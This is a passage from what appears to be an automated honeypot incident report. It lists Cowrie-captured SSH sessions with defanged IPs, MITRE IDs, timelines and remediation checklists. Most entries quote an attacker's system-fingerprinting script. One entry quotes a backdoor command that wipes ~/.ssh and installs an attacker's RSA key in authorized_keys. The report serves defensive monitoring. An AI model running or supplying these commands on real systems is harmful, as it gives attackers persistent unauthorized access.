- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129bfbcca6ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:29 |
| **Last Seen** | 2026-07-06 12:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:29:59` | `cowrie.session.connect` |
| `2026-07-06 12:29:59` | `cowrie.client.version` |
| `2026-07-06 12:29:59` | `cowrie.client.kex` |
| `2026-07-06 12:30:00` | `cowrie.login.success` |
| `2026-07-06 12:30:01` | `cowrie.session.params` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.success` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.command.input` |
| `2026-07-06 12:30:01` | `cowrie.log.closed` |
| `2026-07-06 12:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512a1d15a8ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:31 |
| **Last Seen** | 2026-07-06 12:31 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:31:08` | `cowrie.session.connect` |
| `2026-07-06 12:31:11` | `cowrie.client.version` |
| `2026-07-06 12:31:11` | `cowrie.client.kex` |
| `2026-07-06 12:31:26` | `cowrie.login.success` |
| `2026-07-06 12:31:32` | `cowrie.session.params` |
| `2026-07-06 12:31:32` | `cowrie.command.input` |
| `2026-07-06 12:31:32` | `cowrie.command.input` |
| `2026-07-06 12:31:32` | `cowrie.command.input` |
| `2026-07-06 12:31:32` | `cowrie.command.input` |
| `2026-07-06 12:31:33` | `cowrie.command.input` |
| `2026-07-06 12:31:33` | `cowrie.command.success` |
| `2026-07-06 12:31:33` | `cowrie.command.input` |
| `2026-07-06 12:31:33` | `cowrie.command.input` |
| `2026-07-06 12:31:33` | `cowrie.command.input` |
| `2026-07-06 12:31:33` | `cowrie.command.input` |
| `2026-07-06 12:31:36` | `cowrie.log.closed` |
| `2026-07-06 12:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43b9c01b54ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:31 |
| **Last Seen** | 2026-07-06 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:31:33` | `cowrie.session.connect` |
| `2026-07-06 12:31:33` | `cowrie.client.version` |
| `2026-07-06 12:31:33` | `cowrie.client.kex` |
| `2026-07-06 12:31:34` | `cowrie.login.success` |
| `2026-07-06 12:31:35` | `cowrie.session.params` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.success` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.command.input` |
| `2026-07-06 12:31:35` | `cowrie.log.closed` |
| `2026-07-06 12:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734a60716791

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 12:32 |
| **Last Seen** | 2026-07-06 12:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:32:50` | `cowrie.session.connect` |
| `2026-07-06 12:32:51` | `cowrie.client.version` |
| `2026-07-06 12:32:51` | `cowrie.client.kex` |
| `2026-07-06 12:32:58` | `cowrie.login.success` |
| `2026-07-06 12:33:03` | `cowrie.session.params` |
| `2026-07-06 12:33:03` | `cowrie.command.input` |
| `2026-07-06 12:33:04` | `cowrie.log.closed` |
| `2026-07-06 12:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1bee9b819f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:33 |
| **Last Seen** | 2026-07-06 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:33:05` | `cowrie.session.connect` |
| `2026-07-06 12:33:06` | `cowrie.client.version` |
| `2026-07-06 12:33:06` | `cowrie.client.kex` |
| `2026-07-06 12:33:07` | `cowrie.login.success` |
| `2026-07-06 12:33:08` | `cowrie.session.params` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.success` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.command.input` |
| `2026-07-06 12:33:08` | `cowrie.log.closed` |
| `2026-07-06 12:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4287596c6c32

| Field | Detail |
|---|---|
| **Source IP** | `38.22.170[.]10` |
| **First Seen** | 2026-07-06 12:33 |
| **Last Seen** | 2026-07-06 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:33:23` | `cowrie.session.connect` |
| `2026-07-06 12:33:23` | `cowrie.client.version` |
| `2026-07-06 12:33:23` | `cowrie.client.kex` |
| `2026-07-06 12:33:23` | `cowrie.login.success` |
| `2026-07-06 12:33:24` | `cowrie.session.params` |
| `2026-07-06 12:33:24` | `cowrie.command.input` |
| `2026-07-06 12:33:24` | `cowrie.command.failed` |
| `2026-07-06 12:33:24` | `cowrie.log.closed` |
| `2026-07-06 12:33:25` | `cowrie.session.params` |
| `2026-07-06 12:33:25` | `cowrie.command.input` |
| `2026-07-06 12:33:25` | `cowrie.session.file_download` |
| `2026-07-06 12:33:25` | `cowrie.log.closed` |
| `2026-07-06 12:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.22.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `38.22.170[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99587173d97b

| Field | Detail |
|---|---|
| **Source IP** | `38.22.170[.]10` |
| **First Seen** | 2026-07-06 12:33 |
| **Last Seen** | 2026-07-06 12:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:33:25` | `cowrie.session.connect` |
| `2026-07-06 12:33:25` | `cowrie.client.version` |
| `2026-07-06 12:33:25` | `cowrie.client.kex` |
| `2026-07-06 12:33:25` | `cowrie.login.success` |
| `2026-07-06 12:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.22.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `38.22.170[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45cebbe8983c

| Field | Detail |
|---|---|
| **Source IP** | `38.22.170[.]10` |
| **First Seen** | 2026-07-06 12:33 |
| **Last Seen** | 2026-07-06 12:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:33:25` | `cowrie.session.connect` |
| `2026-07-06 12:33:25` | `cowrie.client.version` |
| `2026-07-06 12:33:26` | `cowrie.client.kex` |
| `2026-07-06 12:33:26` | `cowrie.login.success` |
| `2026-07-06 12:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.22.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `38.22.170[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a59658805f03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:33 |
| **Last Seen** | 2026-07-06 12:34 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:33:33` | `cowrie.session.connect` |
| `2026-07-06 12:33:36` | `cowrie.client.version` |
| `2026-07-06 12:33:36` | `cowrie.client.kex` |
| `2026-07-06 12:33:48` | `cowrie.login.success` |
| `2026-07-06 12:33:56` | `cowrie.session.params` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.success` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:56` | `cowrie.command.input` |
| `2026-07-06 12:33:58` | `cowrie.log.closed` |
| `2026-07-06 12:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a6b3c31042d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:34 |
| **Last Seen** | 2026-07-06 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:34:37` | `cowrie.session.connect` |
| `2026-07-06 12:34:38` | `cowrie.client.version` |
| `2026-07-06 12:34:38` | `cowrie.client.kex` |
| `2026-07-06 12:34:39` | `cowrie.login.success` |
| `2026-07-06 12:34:40` | `cowrie.session.params` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.success` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.command.input` |
| `2026-07-06 12:34:40` | `cowrie.log.closed` |
| `2026-07-06 12:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aaedf41ef70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:35 |
| **Last Seen** | 2026-07-06 12:36 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:35:48` | `cowrie.session.connect` |
| `2026-07-06 12:35:50` | `cowrie.client.version` |
| `2026-07-06 12:35:50` | `cowrie.client.kex` |
| `2026-07-06 12:36:05` | `cowrie.login.success` |
| `2026-07-06 12:36:12` | `cowrie.session.params` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.success` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:12` | `cowrie.command.input` |
| `2026-07-06 12:36:15` | `cowrie.log.closed` |
| `2026-07-06 12:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c210bf54e6

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 12:37 |
| **Last Seen** | 2026-07-06 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:37:34` | `cowrie.session.connect` |
| `2026-07-06 12:37:34` | `cowrie.client.version` |
| `2026-07-06 12:37:34` | `cowrie.client.kex` |
| `2026-07-06 12:37:34` | `cowrie.login.success` |
| `2026-07-06 12:37:35` | `cowrie.session.params` |
| `2026-07-06 12:37:35` | `cowrie.command.input` |
| `2026-07-06 12:37:35` | `cowrie.log.closed` |
| `2026-07-06 12:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b44a337813

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:37 |
| **Last Seen** | 2026-07-06 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:37:41` | `cowrie.session.connect` |
| `2026-07-06 12:37:41` | `cowrie.client.version` |
| `2026-07-06 12:37:41` | `cowrie.client.kex` |
| `2026-07-06 12:37:43` | `cowrie.login.success` |
| `2026-07-06 12:37:44` | `cowrie.session.params` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.success` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:44` | `cowrie.command.input` |
| `2026-07-06 12:37:45` | `cowrie.log.closed` |
| `2026-07-06 12:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dba716a59f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:38 |
| **Last Seen** | 2026-07-06 12:38 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:38:05` | `cowrie.session.connect` |
| `2026-07-06 12:38:08` | `cowrie.client.version` |
| `2026-07-06 12:38:08` | `cowrie.client.kex` |
| `2026-07-06 12:38:22` | `cowrie.login.success` |
| `2026-07-06 12:38:30` | `cowrie.session.params` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.success` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:30` | `cowrie.command.input` |
| `2026-07-06 12:38:33` | `cowrie.log.closed` |
| `2026-07-06 12:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d5d5cf66e0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 12:38 |
| **Last Seen** | 2026-07-06 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:38:33` | `cowrie.session.connect` |
| `2026-07-06 12:38:33` | `cowrie.client.version` |
| `2026-07-06 12:38:33` | `cowrie.client.kex` |
| `2026-07-06 12:38:34` | `cowrie.login.success` |
| `2026-07-06 12:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
